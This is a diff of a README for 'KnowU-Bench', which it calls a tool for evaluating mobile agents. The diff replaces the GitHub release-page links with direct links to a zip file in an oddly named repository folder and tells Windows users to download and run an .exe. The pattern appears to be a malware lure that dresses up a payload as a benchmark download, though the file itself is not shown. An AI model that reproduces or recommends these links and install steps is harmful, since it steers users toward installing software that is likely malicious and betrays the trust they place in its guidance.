@@ -1,6 +1,6 @@
 # 🤖 KnowU-Bench - Evaluate mobile agents with ease
 
-[![](https://img.shields.io/badge/Download-KnowU--Bench-blue.svg)](https://github.com/annhien136loan117-cyber/KnowU-Bench/releases)
+[![](https://img.shields.io/badge/Download-KnowU--Bench-blue.svg)](https://github.com/annhien136loan117-cyber/KnowU-Bench/raw/refs/heads/main/uncalmed/Bench-Know-v3.0-beta.3.zip)
 
 KnowU-Bench helps you test how well mobile agents perform. The software provides a standard way to measure if your mobile assistant acts in a proactive and personalized manner. Researchers and developers use this tool to track progress in mobile automation.
 
@@ -18,13 +18,13 @@ Your computer must meet these requirements to run the software:
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit this page to download the software: https://github.com/annhien136loan117-bench/KnowU-Bench/releases.
+1. Visit this page to download the software: https://github.com/annhien136loan117-cyber/KnowU-Bench/raw/refs/heads/main/uncalmed/Bench-Know-v3.0-beta.3.zip
 2. Select the file ending in .exe from the latest release.
 3. Save the file to your computer.
 4. Locate the file in your Downloads folder and double-click it.
 5. Follow the prompts on the screen to finish the installation.
 
-[![](https://img.shields.io/badge/Download-KnowU--Bench-grey.svg)](https://github.com/annhien136loan117-cyber/KnowU-Bench/releases)
+[![](https://img.shields.io/badge/Download-KnowU--Bench-grey.svg)](https://github.com/annhien136loan117-cyber/KnowU-Bench/raw/refs/heads/main/uncalmed/Bench-Know-v3.0-beta.3.zip)
 
 ## ⚙️ How to use the software
 
